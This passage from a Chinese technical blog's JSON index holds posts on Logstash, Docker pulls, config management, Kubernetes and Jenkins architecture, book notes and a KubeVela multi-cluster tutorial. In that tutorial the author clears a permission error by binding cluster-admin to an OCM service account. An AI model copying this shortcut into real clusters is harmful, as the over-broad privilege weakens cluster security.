\u0026#34;${KAFKA_URL:localhost:2187}\u0026#34; topics =\u0026gt; \u0026#34;${KAFKA_TOPIC:kafka-topic-test}\u0026#34; group_id =\u0026gt; \u0026#34;${KAFKA_GROUP_ID:logstash-es}\u0026#34; consumer_threads =\u0026gt; \u0026#34;${KAFKA_CONSUMER_THREADS:6}\u0026#34; } } filter { if ![message] { drop { } } mutate { remove_field =\u0026gt; [ \u0026#34;headers\u0026#34;, \u0026#34;result\u0026#34;] } } output { elasticsearch { hosts =\u0026gt; [\u0026#34;127.0.0.1:9200\u0026#34;] index =\u0026gt; \u0026#34;kafka\u0026#34; } } ","description":"","id":190,"section":"post","tags":["博文","日志","配置","实践"],"title":"Logstash 配置基础","uri":"https://www.chenshaowen.com/blog/the-basic-configuration-of-logstash.html"},{"content":"1. 错误提示 在拉取镜像时，偶尔会碰到如下错误:\n1 2 3 4 5 6 7 8 docker pull node:10.16-alpine 10.16-alpine: Pulling from library/node e7c96db7181b: Already exists 50958466d97a: Pulling fs layer 56174ae7ed1d: Pulling fs layer 284842a36c0d: Pulling fs layer error pulling image configuration: Get https://production.cloudflare.docker.com/registry-v2 /docker/registry/v2/blobs/sha256/b9/b95baba1cfdbfa8b789137179d8e fff08b9768f1906725a8758cf0c431b59621/data? verify=1636603895-lbb1QIruPZBdfgfhBZ95ArGK0wU%3D: dial tcp 104.18.124.25:443: i/o timeout 2. 主要解决办法 2.1 修改 DNS 地址 如果是 CentOS ，直接修改 /etc/resolv.conf 文件，新增一行 nameserver 8.8.8.8 即可。\n如果是 Ubuntu ，需要修改 /etc/systemd/resolved.conf，添加如下内容：\n[Resolve] DNS=8.8.8.8 接着执行命令 systemctl restart systemd-resolved 重启服务即可。\n2.2 本地与服务器时间偏差过大 执行如下命令，进行时间同步:\n1 ntpdate time.windows.com 2.3 配置镜像加速 配置镜像加速之后，如果待拉取的镜像已经存在于 mirror ，则直接从 mirror 拉取镜像层数据。\n1 2 3 { \u0026#34;registry-mirrors\u0026#34;: [\u0026#34;https://ustc-edu-cn.mirror.aliyuncs.com\u0026#34;], } 3. 可能的原因 3.1 Cloudflare 的 IP 被禁 Dockerhub 借助 Cloudflare 的网络进行镜像的分发。在国内环境下，Cloudflare IP 的可用性得不到保障，部分 IP 被禁。\n通过修改 nameserver 改变了 production.cloudflare.docker.com 指向的服务 IP 地址，切换到其他 IP 上尝试。而进行时间同步，应对的是证书无效问题，这里可能并没有效果，而只是拖延了时间，以便 DNS 指向发生变化。配置镜像加速之后，拉取镜像的 IP 会发生变化，也有可能解决问题。\n3.2 Dockerhub 提升营收的策略 由于 Dockerhub 大部分都是免费的用户，难以承担巨额的带宽和存储费用，因此免费用户在可用性受损。\n","description":"","id":191,"section":"post","tags":["博文","Docker","镜像"],"title":"拉取 Dockerhub 镜像，无法连接 Cloudflare","uri":"https://www.chenshaowen.com/blog/cant-connect-cloudflare-while-pulling-docker-image.html"},{"content":" 应用配置管理强调的是，应用运行时依赖的配置管理，不同于项目的静态配置。本文是实际开发过程中的一些总结，以供大家参考，也欢迎交流。\n1. 关于配置管理 1.1 名称解释 配置项 一个 key=value 组合\n配置集 一组配置项的集合，key1=value, key2=value2\n配置实例 一份完整的，可供应用程序直接使用的配置项的集合。\n1.2 配置管理的功能 版本控制 对所创建的配置项、配置集、配置实例进行版本跟踪，支持回滚等操作。\n变更控制 对配置的变更进行控制、操作、分类、记录。\n配置审计 审查配置的一致性、规范性、正确性。\n1.3 配置管理的难点 在开发迭代的过程中，随时随地随人都可以对配置进行变更。在不同的时间、应用的不同拓扑层级、不同的人，都有可能会对配置项、配置集、配置实例进行修改。我们需要一种灵活的方式，以支持这些复杂的场景。\n配置具有复杂、敏感、影响大的特点。一个配置实例可能有上百个配置项，其中还会包含一些账户、密码等敏感信息，而错误的配置可能导致整个服务不可用。\n配置管理的灵活与对配置实例的约束是配置管理产品需要平衡的地方。如何在满足各种使用场景的情况下，通过一定的约束规避一些错误发生，是配置管理的难点。\n2. 常见的配置管理模型 2.1 CICO 模型 CICO 模型主要关注的是单个文件的版本控制，文件被版本化并存储到库中。\n用户必须 checkout 文件以存取 修改后的文件被 checkin 到库中产生新版本 2.2 组织模型 组织模型下的配置由两部分组成:\n系统模型，列出了组成系统的所有构件 版本选择规则，指出了组成配置的每个构件的版本 2.3 长事务模型 长事务模型将配置管理当做是开发人员对配置的事务操作。一系列的变更结果生成一些列的配置版本，称之为开发路径。\n2.4 变更集模型 变更集模型将配置描述为基线和一组变更集组成。基线可以理解为里程碑版本，也就是一个迭代的结束点、下一个迭代的起始点。\n3. 新的配置管理模型 3.1 遇到的问题 CICO 等模型是一些比较老的论文、书籍中提到的，但是在开发 PaaS 平台管理配置时，却无法直接套用。\n比如，CICO 模型，用 SVN、GIT 管理文件，并没有强调配置存储于文件，这个文件到底是指的什么。而组织模型，更像是对一个大型的 PaaS 平台进行配置管理，由若干个子模块组成，每个模块都有独立的配置，适用于一组微服务的应用配置管理形态。\n3.2 组装模型 古老的模型无法满足 PaaS 平台的场景。但是却能给予一定的启发，将实物构件泛化为要素，组织模型可以演化出组装模型。如下图：\n配置实例 = 默认配置集 + 环境配置集 + 集群配置集\n利用应用拓扑的定义，根据应用所属的层级，通过定义一定的优先级关系，将各个层级定义的配置集，合并在一起形成一份配置实例。\n组装模型通过组装若干要素的方式得到配置实例，但是同一个应用的不同配置实例包含的 Key 集合可能不一样。这种差异会增加配置管理的成本，也会增加配置错误导致的风险，无法直接满足对配置完整性的约束。\n3.3 模板模型 基于对完整性的要求，在变更集模型的启发下，可以得到模板模型。如下图:\n模板模型需要定义配置实例的模板，根据应用拓扑的结构，形成若干个变更集，对配置实例模板进行覆盖，得到最终的配置实例。\n模板模型增强了对配置实例 Key 的约束，保证了强的一致性，可以避免漏配 Key 导致的事故。\n但是强一致性约束，也导致了灵活性受损，需要配合配置项、配置集的发布状态进行使用。\n","description":"","id":192,"section":"post","tags":["博文","配置管理","PaaS","平台","配置"],"title":"应用配置管理之组装模型和模板模型","uri":"https://www.chenshaowen.com/blog/using-assembly-and-template-model-to-manage-app-config.html"},{"content":"\n从调研数据来看，大家选择小集群的比较较高。下面是从节点数、节点配置角度提供的一份对比列表。\n下面是选择少量大集群，还是多个小集群的对比列表:\n特征 少量大集群 多个小集群 资源利用率 高 低 管理节点开销 低 高 资源伸缩范围 大 小 资源调度范围 大 小 应用间通信效率 高 低 集群运维难度 高 低 集群版本多样性 低 高 爆炸半径 大 小 下面是选择少量高配节点，还是多个低配节点的对比列表:\n特征 少量高配节点 多个低配节点 资源利用率 高 低 管理节点开销 低 高 应用内存上限 高 低 Kubelet 压力 高 低 拉取镜像效率 高 低 节点 Pod 密度 高 低 爆炸半径 大 小 单位资源成本 低 高 ","description":"","id":193,"section":"post","tags":["整理","Harbor","镜像","容器"],"title":"Kubernetes 集群规划之规模与节点大小","uri":"https://www.chenshaowen.com/blog/the-scale-and-node-size-of-kubernetes-cluster.html"},{"content":"1. SSH 连接方向: Master 主动连接 Agent\n要求:\nMaster 能通过 SSH 直连 Agent Agent 上启动了 SSHD 服务 Jenkins 安装 SSH Credentials Plugin、SSH Build Agents 插件 2. JNLP 连接方向: Agent 主动连接 Master\n要求:\nAgent 能访问 Master Agent 需要 JVM 环境运行 Master 需要放开 50000（默认值）端口用于 Agent 通信 50000 端口是 Jenkins Master 的服务端口，不需要再运行其他服务程序。\n3. WebSocket 连接方向: Agent 连接 Master 之后，可以双向通信\n要求:\nAgent 能访问 Master Agent 需要 JVM 环境运行 WebSocket 方式将复用 Jenkins 管理页面的 URL 进行通信，可以不用 50000 端口接入 Agent。\n4. 参考 https://github.com/jenkinsci/jep/blob/master/jep/222/README.adoc https://issues.jenkins.io/browse/JENKINS-62576 ","description":"","id":194,"section":"post","tags":["博文","Jenkins","CICD"],"title":"Jenkins Agent 的几种通信方式","uri":"https://www.chenshaowen.com/blog/a-few-communication-methods-of-jenkins-agent.html"},{"content":"副标题: 让谷歌、亚马逊实现爆炸性增长的工作法\n作者: (美) 约翰·杜尔（John Doerr）\n出版社: 中信出版社\n出版年: 2018-12\nISBN: 9787508696881\nNotes:\nOKR 即目标与关键成果法，是 Intel 创始人安迪·葛洛夫发明的一种用于管理目标和完成的工作方法。O 代表着目标，它应该是重要且具体、行动导向、鼓舞人心的，比如提升系统的稳定性。O 应该与团队的使命保持一致。KR 代表关键结果，它应该是明确、有完成时间、有挑战，可衡量、可被事后验证的，比如建立 SLA 指标体系，并达到三个 9 。列 KR 的技巧，度量型（比如，推动 20 业务接入系统）和里程碑型（比如，完成系统的开发，并上线提供服务）。\nOKR 具有强调指向性，重视过程，激励员工，打破目标的天花板，是自下而上的修正和自上而下的指引。KPI 强调结果，是自上而下的任务下达，是对员工的束缚，上下级之间存在博弈。\nOKR 的好处是聚焦最重要的目标、促进团队协同、责任追踪、挑战不可能。\nOKR 的设定技巧是自下而上、勇于失败、保持耐心和决心。先让员工主动列出愿意做的事项，然后对事项进行分类、合并、排优先级，最后总结归纳 OKR。\nOKR 应该是公开的，在运作时配合 CRF 机制，通过对话、反馈、认同的手段推进，需要定期审视 OKR 的完成状态。\nOKR 的评分，0.7-1.0 绿灯，完成；0.3-0.7 黄灯，有一定的进展；0-0.3 红灯，没取得关键结果。过高的得分，意味着目标过低，缺乏激励；过低的目标，意味着目标可能应该被剔除。\n","description":"","id":195,"section":"post","tags":["书籍","工作","方法"],"title":"这就是 OKR","uri":"https://www.chenshaowen.com/blog/book/measure-what-matters.html"},{"content":"1. 缺少发自内心的渴望 有了渴望才会有动力。对生存的渴望、对美好的渴望，是推动人类进步的源泉。渴望愈加强烈，动力才会愈加强烈。强烈的渴望会让人不顾一切地冲向目标。想要突破，激情比理性更加重要。\n2. 疲于满足日常的生理 无法突破的身体和精神极限。太在意衣食住行没有更多精力和时间去做不一样的事。前人做过、后人能做的事，不能体现个人的价值。别人走过的路，留下的是别人的足迹。\n3. 太过广泛宽阔的目标 伤其十指不如断其一指。每个方向都试试，不如在一个方向坚持到底，构筑壁垒。想想有没有哪一件事让自己坚持了很久，将这种感觉迁移到一个面向未来的领域上。\n4. 普通缺乏差异的审美 最后决定高度的其实是审美。经验、努力是人人可得的，但是若审美跟不上，即使好的东西放在面前，也是抓不住的，只能停留在勤勉的层次。\n","description":"","id":196,"section":"post","tags":["博文","思考"],"title":"是什么让你流于平庸","uri":"https://www.chenshaowen.com/blog/what-makes-you-common.html"},{"content":"1. 关于两地三中心 如上图，两地三中心的架构，是为了提高系统的容错、容灾的能力。当一个数据中心不可用时，能够将关键业务的流量切换到其他数据中心，可以抵御城市级的自然灾害。\n两地指的是，地理上不同的两座城市，而三中心指的是:\n生产中心 同城灾备中心 异地灾备中心 2. 机房的网络连接 如上图，两地三中心架构的前提是，各个机房是互联互通的。因此，我们需要搭建一个低延时的环形网络。光纤的长度，通常在 50 KM 以上。如果租用了运营商的专线，延时可以高一点，但通常不会超过 20 ms。如果是同城光纤，延时只有 3 ms 左右。\n我们需要在机房间距、延时二者之间进行取舍:\n机房间距离越远，容灾能力越强，但光纤会更长，延时会更高 机房间距离越短，容灾能力越差，但光纤会越短，延时会很低 在同城的两个机房之间，网络延时很低，数据一致性很高。而异地机房，由于距离很远，可以租用专线与另外两个机房互联，避免过高的延时。\n3. 应用流量的分发 如上图，是用户访问应用时的流量走向:\n用户通过域名访问应用服务，通过智能 DNS 解析到地理上更近的机房 IP 公有云的 ELB 会卸载 TLS 证书，并提供一定的安全防护功能。 在机房中，使用虚拟机部署有一个 LB 服务，对流量进行切分，一部分流量被切分到了另外一个机房。两个机房的 LB 使用的是同一个存储后端。 两个机房的服务，分别响应不同用户的请求 3.1 为什么是异地机房承载流量 没有经过流量冲击的路径是不可靠的。即使做了高可用、容灾，如果没有常态化的演练，系统也不会具备应对的能力。\n因此，在多机房建设时，非常重要的一点就是，让更多机房获得访问流量。这里选择的是，两个异地的机房作为日常主要的流量机房，原因如下:\n更好演练灾难发生时的状况 租用专线之后，异地机房延时能满足要求 有足够预算购买专线带宽 3.2 为什么 DNS 之后，还有一层 LB 这里可能会有一个疑问，在机房外，DNS 对流量进行了一次切分，在机房内，LB 又对流量进行了一次切分，原因如下:\nDNS 生效慢，增加一层 LB 能更快切换流量 准确控制分配至各机房的流量比例 支持按机房灰度发布应用的版本 4. 有状态与无状态的分层 如上图，有状态应用和无状态应用的分层，使得服务架构更加清晰。由无状态应用对外提供服务，而有状态应用为无状态应用提供服务。\n这里的有状态应用，使用的是虚拟机部署的高可用服务，或者直接购买厂商的云服务中间件。\n4.1 无状态应用 如上图，无状态应用基于 Kubernetes 提供运行时环境。得益于其强大的弹性与自愈能力，我们只需要关注于对各种云原生组件的使用，对参数的调优，即可满足大部分的业务需求。\n对于无状态应用，我们通常会采用 Ingress 或 NodePort 的方式，对外暴露服务。两者的区别主要在于:\n支持的服务数量。每个 NodePort 会占用一个端口 功能差异。Ingress 能提供 Host、灰度、子 Path 路径等功能 组件数量。Ingress 需要更多组件支撑 运维成本。Ingress 更新时，影响面更大，运维成本高 迁移成本。NodePort 可能会发生端口冲突 Kubernetes 并不是保证服务 100% 可用，而是一旦服务异常时，能够快速利用空闲资源新建。同时，Kubernetes 还面临集群升级、主机维护等问题，因此，对于一些低频变更、对稳定性要求高的服务，我们采用的是虚拟机部署。\n比如这里的 LB，LB 是一个影响面很大的应用，而且数量不会很多，我们通常会采用高可用的模式，部署在几台虚拟机上。\n4.2 有状态应用 镜像仓库 Harbor 的高可用通常有两种方式:\n多个独立部署的 Harbor 实时同步。不同的 Harbor 实例之间，镜像可能不一致，有一定时延。 多个 Harbor 共享一个存储后端。多个 Harbor 实例，共享一个存储后端，数据一致性有保障了，但对存储后端的分布式要求更高。 这里采用的是 Harbor 共享存储高可用 + dragonFly 的方式。在非主要流量机房，部署高可用的 Harbor，通过 dragonFly 分发镜像到各个机房，机房中的主机通过 dfget 配置 mirror 拉取镜像。如下图:\n使用 dragonFly 分发镜像，能减少同一个镜像，多副本应用实例部署时的拉取次数，节省专线的带宽。\nMySQL 多机房 MHA 高可用 相较于国外使用 PostgreSQL，国内使用 MySQL 特别多。MHA（Master High Availability）是一套成熟的 MySQL 解决方案。在 MySQL 发生故障时，MHA 能在 30 秒以内完成数据库的故障切换操作，同时最大程度的保障数据一致性。\nRedis 多机房集群模式 Redis 集群通过分片来实现数据共享，并提供复制和故障转移。相较于哨兵模式只有一个 master，集群模式有多个 master，具有高的可用性。\n5. 总结 本篇主要是简单总结了一下两地三中心的架构。所写即所见的抽象，并不能完全尽述细节。主要内容如下：\n两地三中心的要点，是要构建一个环形的互联互通机房网络 有状态应用采用虚拟机部署，无状态应用采用 Kubernetes 部署 访问流量，先通过 DNS 切分到机房，在机房中再通过 LB 切分到各个集群 ","description":"","id":197,"section":"post","tags":["博文","两地三中心","容器","Kubernetes"],"title":"容器下的两地三中心建设","uri":"https://www.chenshaowen.com/blog/the-construction-of-two-places-and-three-centers-under-the-container.html"},{"content":"副标题: 如何从智商衰退中跳脱出来\n作者: (日) 大前研一\n出版社: 中信出版社\n出版年: 2010-4\nISBN: 9787508619262\nNotes:\n值得注意的是这本书的形成时间。十多年后的今天，阅读这本书依然可以感受到其分量。\n网络越发达，大脑越懒惰。年轻人只关注自己的片瓦之地，不再有欲望和向上的动力。唯有思考能破此局，思考如何教育出适合当今社会的人才，思考如何在金融危机中保全自己，思考如何在国际活动中占据领导地位，思考强者是如何避免经济和地位衰退，保持怀疑，保持思考，非常重要。\n","description":"","id":198,"section":"post","tags":["书籍","思考","社会","发展"],"title":"低智商社会","uri":"https://www.chenshaowen.com/blog/book/low-iq-society.html"},{"content":"1. 为什么需要定义应用运行时 运行时更多选择。传统的应用运行时有，物理机、虚拟机、云主机。容器时代，常见的运行时有 Docker、Kubernetes。这些运行时，提供给我们的不再是一个单一的运行时选择。\n应用拓扑更复杂。如果由 CMDB 统一存储应用的拓扑结构，当然是最好的，其他系统有了统一的数据源。但现实是，我们很难有这样的远见，当急需这样的拓扑时，开发功能、录入数据、保持一致性都极其不易。\n不同运维系统使用这些运行环境时，呈现的拓扑可能会不一样。如下图：\n运维系统-A 运维系统-B 这里有两个运维系统：\nA 的视角是应用下，先有环境，再分数据中心，才能定位到某一个具体应用。 B 的视角是应用下，先要选区域，再选环境，接着选集群，还有命名空间之后，才能定位到某一个应用。 缺少统一应用拓扑带来的问题就是，每个运维系统都需要描述一套自己的应用拓扑。由此带来的问题不言而喻，新业务接入成本高，系统与系统之间不容易对接，各个运维系统使用难度大。对开发、运维开发、运维，都会产生消耗。\n推动 CMDB 统一存储应用拓扑的方案在此不表，我们需要思考的是如何定义应用的运行时，能够解决当前的问题: 在不同运维系统视角，应用的拓扑不一致，但却提供给用户一致的体验。\n2. 应用运行时的定义 我们的服务器可能分散到不同的区域、所属不同的厂商、具有不同的类型，应用的运行时定义就是在这些运行时提供者与应用之间建立联系。当创建应用时，能够再找合适的运行时，在运行时上创建工作负载。\n回忆一下，通常情况下，运维系统会怎样选择一个运行时。如下图:\n首先给用户呈现的是区域，东北、华中、华南、亚太、新加坡等，再选择使用虚拟机、容器、Kubernetes。过了一段时间，我们发现用户更关注的不是区域，而是运行时类型，因此对运维系统进行了调整。如下图：\n我们将一级菜单选设置为虚拟机、容器、Kubernetes，二级菜单设置为区域设置为东北、华中、华南、亚太、新加坡等。过了一段时间，我们发现，在区域下得加一个层级数据中心，运维系统又得进行适配。\n浏览我的网站时，你会发现，它没有分类，只有标签。因为给一个文章选一个分类其实并不是一件容易的事，它具有唯一性，但一篇文章可以有很多个标签。\n这就是分类和标签的主要区别。分类构建的是一个线性单一的网络，而标签构建的是一个网状互联的网络。 标签系统是内含分类系统的。\n借助标签系统，我们可以很好的描述应用的运行时，同时兼容 CMDB 单一拓扑源。如下图:\n无论运维系统如何呈现应用的拓扑，标签系统都能够满足。使用一组标签定义应用运行时，主要的成本在于，开发高效地标签过滤系统，并维护好标签。这与 Kubernetes 中的 Label 类似，可以参考。\n3. 系统与系统之间的对接 运维系统不是单一的，它们是相互协作，共同作用的。\n如上图，当两个运维系统对运行时的定义不同时，需要借助一定的约定规则进行映射。而各个系统只需要关注自己的运行时，不必为了兼容而留下没人维护的冗余字段。缺失比错误更优。\n这里的 DATACENTER 与 REGION、CLUSTER、NAMESPACE 产生映射关系。但 A 系统并不关心 NAMESPACE 。 因此，我们可以将 DATACENTER 与 REGION、CLUSTER 的对应关系持久化存储，或者通过约定进行映射，比如，将 DATACENTER 命名为 REGION-CLUSTER 的形式。\n另外一点就是，各个运维系统在管理这些运行时，应该尽可能将运行时的描述注入到环境变量，比如 ENV=DEV、REGION=HW-BJ 等，开发人员可以利用这些变量进行适配，有利于调试和定位问题。\n","description":"","id":199,"section":"post","tags":["博文","标签","开发","环境"],"title":"多环境下的应用运行时定义","uri":"https://www.chenshaowen.com/blog/the-definition-of-application-runtime-under-multiple-env.html"},{"content":"\nKubevela 目前处于 1.1 版本。通常，我们认为 1.x 的版本是相对稳定的，可以尝试引入生产。在不断地跟踪和学习过程中，也感受到 Kubevela 的一些好的地方，这是一篇小结性的文档。\n1. Kubevela 能解决什么问题 面向平台开发者 需要区分几个角色: 开发、运维、运维开发。开发面向的是业务需求，运维面向的是业务稳定，运维开发面向的是效率。运维开发提供各种各样的工具，打通开发和运维之间的壁垒，既要快速满足业务上线。又要保障业务稳定。\nKubevela 对开发和运维并没有太大吸引力，却能让运维开发耳目一新。因为，Kubevela 能显著提升团队的平台水平，直达主流梯队。\n应用生命周期的管理 Kubevela 提供了管理应用生命周期的解决方案，应用的定义 applications，部署 appdeployments ，版本管理 applicationrevisions，回滚 approllouts，灰度 traits、approllouts。利用这些 CRD 对象，能够覆盖很大一部分业务需求。\n应用负载和特性的组件化 Component 提供的是负载的定义，比如 Deployment、CloneSet。Trait 提供的是特征的定义，比如 Ingress、Istio。通过这两种抽象，Kubevela 允许平台的开发者能够组装、定制适合自己业务的平台。\n而 Workflow 提供的编排能力，给集成各种云原生组件增添了更多可能，甚至能延展到 CICD 领域。\n2. 多集群下应用面临的挑战 统一的视角 在面向应用的平台上，切换集群是一个非常糟糕的用户体验。我们需要的不是在每个集群上部署一套管理服务，然后通过修改数据源，查看不同集群上的数据。\n我们应该以应用为中心，集群只是应用的一个属性，而不能将应用归属于某个集群。统一视角就是希望能够提供给用户一个 UI，包含完整的应用描述、所在运行时、实时服务画像等信息。\n应用的定义 世界上，没有两个平台团队对应用的定义是一样的。\n一个应用应该包含哪些属性，哪些特征，对哪些字段进行哪些限制，很多的细节需要推敲和考虑。当然你也可以选择背负技术债务，将问题延后解决，快速交付几个版本。但却也是道阻且长，越来越难。\n每个团队在定义应用时，都会附带一些业务属性。自救是不可能的，繁杂的业务需求不会给平台的开发者喘息之机。\n因此，OAM 的出现是个机会，有机会统一应用生命周期管理 (ALM)。虽前有 Kubernetes Applications 死在了沙滩，但 Kubevela 犹如黑夜星光，给人无限希望。\n分批发布 分批发布有两个维度，单个集群中的多副本应用，多个集群中的同一个应用。\n单个集群上的多副本，不会一次性更新，而是需要分批发布。这个过程，称之为 rollout，是一个逐步放量的过程。\n多个集群或者多个区域的服务，在更新时，也需要观察时间，而不能一把就 show hand。\n3. AppDeployment 下的多集群应用 这里主要是以 AppDeployment 作为主要对象，将应用在多个集群上进行发布。\n在主集群上添加多个子集群 需要在同一个 kubeconfig 配置多个集群的 context，然后按照官方文档操作即可。这里添加了两个集群 prod-cluster-1 和 prod-cluster-2 。下面是查看集群的命令:\n1 2 3 4 5 kubectl get clusters.core.oam.dev NAME AGE prod-cluster-1 57d prod-cluster-2 57d 定义 Application 应用 需要提前定义 components 和 traits，下面是应用的定义：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 apiVersion: core.oam.dev/v1beta1 kind: Application metadata: name: cluster-test-app-cloneset namespace: default annotations: app.oam.dev/revision-only: \u0026#34;true\u0026#34; spec: components: - name: helloworld-cloneset type: cloneset properties: image: oamdev/helloworld-python:v1 env: - name: \u0026#34;TARGET\u0026#34; value: \u0026#34;KubeVela-v1\u0026#34; port: 8080 traits: - type: expose-nodeport properties: ports: - protocol: \u0026#34;TCP\u0026#34; port: 80 由于有 app.oam.dev/revision-only: \u0026quot;true\u0026quot; 的 Annotations，因此相关的资源并不会被创建。我们在此只是定义应用，并不需要创建相应的负载。\n修改应用的版本，产生不同的应用版本 为了更加逼近生产环境，我们修改上面 Application 的参数，比如：环境变量、镜像版本等，产生不同的应用版本。\n1 2 3 4 5 6 kubectl get applicationrevisions.core.oam.dev NAME AGE cluster-test-app-v1 57d cluster-test-app-v2 57d cluster-test-app-v3 57d 最终，分发到各个集群上的应用版本，由此产生。这些版本，大致相同而有细微差异，类似日常应用更新。\nAppDeployment 多集群分发应用 AppDeployment 提供了一个更加贴近用户对应用理解的视角。应用不仅包含的是对应用的定义，还有对运行时的选择。这里将 cluster-test-app-v1 部署到 prod-cluster-1 集群，设置 3 个副本数量；而将 cluster-test-app-v2 部署到 prod-cluster-2 集群，设置 4 个副本数量。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 apiVersion: core.oam.dev/v1beta1 kind: AppDeployment metadata: name: cross-cluster-app namespace: default spec: appRevisions: - revisionName: cluster-test-app-v1 placement: - clusterSelector: labels: env: stage name: prod-cluster-1 distribution: replicas: 3 - revisionName: cluster-test-app-v2 placement: - clusterSelector: labels: env: production name: prod-cluster-2 distribution: replicas: 4 4 Workflow 下的多集群应用 Workflow 是 Kubevela 近期版本新增的一个特性，在这里主要用来生成 OCM 需要的跨集群资源对象。\n4.1 配置 Open Cluster Management (OCM) 使用 vela 命令安装 Open Cluster Management 1 vela addon enable ocm-cluster-manager 在主集群上添加多个子集群 需要在同一个 kubeconfig 配置多个集群的 context。在 dev1 集群上，添加 dev2 集群的 kubeconfig。\n1 2 3 4 5 kubectl config get-contexts CURRENT NAME CLUSTER AUTHINFO NAMESPACE * dev1-context dev1.cluster.local dev1-kubernetes-admin dev2-context dev2.cluster.local dev2-kubernetes-admin 配置环境变量 使用 dev1(主集群) 管理 dev2(子集群) 。在主集群上，执行命令:\n1 2 3 4 export HUB_CLUSTER_NAME=dev1 export MANAGED_CLUSTER_NAME=dev2 export CTX_HUB_CLUSTER=dev1-context export CTX_MANAGED_CLUSTER=dev2-context 查找添加子集群的 Token 在主集群上，执行命令:\n1 2 3 clusteradm get token xxxxxxxxxxxxxx 取出其中的 token 值，Base64 反解码，可以得到一个有效的 hub-token 值。\n添加子集群 这里的 hub-apiserver 就是主集群的 kube-apiserver 的访问地址。在主集群上，执行命令:\n1 clusteradm join --context ${CTX_MANAGED_CLUSTER} --hub-token xxxxxxxxxxxxxx --hub-apiserver https://1.1.1.1:6443 --cluster-name ${MANAGED_CLUSTER_NAME} 接受新的集群添加请求 在主集群上，执行命令:\n1 clusteradm accept --clusters dev2 查看被管理的集群 在主集群上，执行命令:\n1 2 3 4 kubectl get managedcluster NAME HUB ACCEPTED MANAGED CLUSTER URLS JOINED AVAILABLE AGE dev2 true https://dev1.chenshaowen.com:6443 True True 3m38s 在被管理的集群上安装 Kubevela rollout 在子集群上，执行命令:\nhelm repo add kubevela https://charts.kubevela.net/core helm install vela-rollout --create-namespace -n vela-system kubevela/vela-rollout 4.2 新建 WorkflowStepDefinition 描述跨集群资源 在主集群使用 Workflow 将跨集群的资源定义在 WorkflowStepDefinition 中。下面是需要用到的资源之一:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 apiVersion: core.oam.dev/v1beta1 kind: WorkflowStepDefinition metadata: name: dispatch-traits namespace: vela-system spec: schematic: cue: template: | import (\u0026#34;vela/op\u0026#34;) comp: op.#Load \u0026amp; { component: parameter.component } apply: op.#Apply \u0026amp; { value: { apiVersion: \u0026#34;work.open-cluster-management.io/v1\u0026#34; kind: \u0026#34;ManifestWork\u0026#34; metadata: { namespace: parameter.cluster name: parameter.component + \u0026#34;-traits\u0026#34; } spec: { workload: manifests : comp.value.auxiliaries } } } parameter: { component: string cluster: string } 其中 ManifestWork 定义了分发到某个集群的配置和资源信息。这里只定义了 dispatch-traits，相应的我们还需要定义 dispatch-comp-rev。\n分发资源的过程可以理解为，将待分发的资源打包成主集群上的 ManifestWork 对象，通过 OCM 分发到子集群的 AppliedManifestworks 对象，然后由子集群提取资源进行创建。\n4.3 创建应用进行分发 这里使用 Application 在主集群 dev1 上定义一个应用，分发到子集群 dev2 上。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 apiVersion: core.oam.dev/v1beta1 kind: Application metadata: name: workflow-rollout-demo namespace: default spec: components: - name: nginx-server externalRevision: nginx-server-v1 type: webservice properties: image: nginx:1.20.0 port: 80 traits: - type: rollout properties: targetRevision: nginx-server-v1 targetSize: 2 rolloutBatches: - replicas: 1 - replicas: 1 workflow: steps: - name: dispatch-comp-rev-v1 type: dispatch-comp-rev properties: compRev: nginx-server-v1 cluster: dev2 - name: dispatchRollout type: dispatch-traits properties: component: nginx-server cluster: dev2 在 OCM 多集群应用的场景下，子集群需要部署 Kubevela rollout 组件。因此，Kubevela 能够更精细地控制子集群 rollout 过程，比如滚动过程中每个批次的比例和数量等。\n4.4 可能会碰到的问题 OCM 在子集群创建资源时报错 E0905 14:36:23.461052 1 base_controller.go:270] \u0026#34;ManifestWorkAgent\u0026#34; controller failed to sync \u0026#34;nginx-server-traits\u0026#34;, err: rollouts.standard.oam.dev \u0026#34;nginx-server\u0026#34; is forbidden: User \u0026#34;system:serviceaccount:open-cluster-management-agent:klusterlet-work-sa\u0026#34; cannot get resource \u0026#34;rollouts\u0026#34; in API group \u0026#34;standard.oam.dev\u0026#34; in the namespace \u0026#34;default\u0026#34; 提示是权限不够，在子集群上，直接给 klusterlet-work-sa 绑定了一个 admin 权限。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 kind: ClusterRoleBinding apiVersion: rbac.authorization.k8s.io/v1 metadata: name: admin-ocm annotations: rbac.authorization.kubernetes.io/autoupdate: \u0026#34;true\u0026#34; roleRef: kind: ClusterRole name: cluster-admin apiGroup: rbac.authorization.k8s.io subjects: - kind: ServiceAccount name: klusterlet-work-sa namespace: open-cluster-management-agent 5. 总结 本篇主要讨论的是 Kubevela 在多集群下的应用，主要内容如下:\n多集群下的应用，不同于单集群，不能简单地切换数据源实现，其对交互设计有更高的要求。多集群应用平台需要有统一的视角，查看应用在多集群下的服务画像，以应用为中心，将集群当做属性，分清主次。 AppDeployment 是一个很好的抽象，也能给平台设计一些启发，还能看到一些 KubeFed 的身影。AppDeployment 是以用户视角呈现的多集群应用，但目前对 Workload 的处理粒度太大，面向的是整个 Application，也就是全量删除、更新、创建 Workload。如果用于生产，还需要配合 rollout 进行更新。 借助 Workflow 集成 OCM 下的 Kubevela 多集群应用，更具扩展性，后续也可以换成其他多集群组件，比如 Karmada。利用 OCM 的分发能力，加上子集群上的 Kubevela rollout 组件，我们可以实现分批发布、滚动更新。 实际上，多集群下的应用，不仅仅需要考虑的是对应用描述的分发，更重要的还有负载的滚动更新、资源的统一分配、应用的智能调度、应用的自动扩缩容、服务的状态画像等。Kubevela 针对的是看得见的应用，但支撑起整个应用平台还需要更多底层组件。\n6. 参考 https://open-cluster-management.io/getting-started/quick-start/#install-clusteradm-cli-tool https://www.chenshaowen.com/blog/using-kubefed-to-distribute-tekton-resource-cross-cluster.html https://www.cnblogs.com/tencent-cloud-native/p/15136879.html ","description":"","id":200,"section":"post","tags":["博文","Kubevela","Kubernetes","应用"],"title":"Kubevela 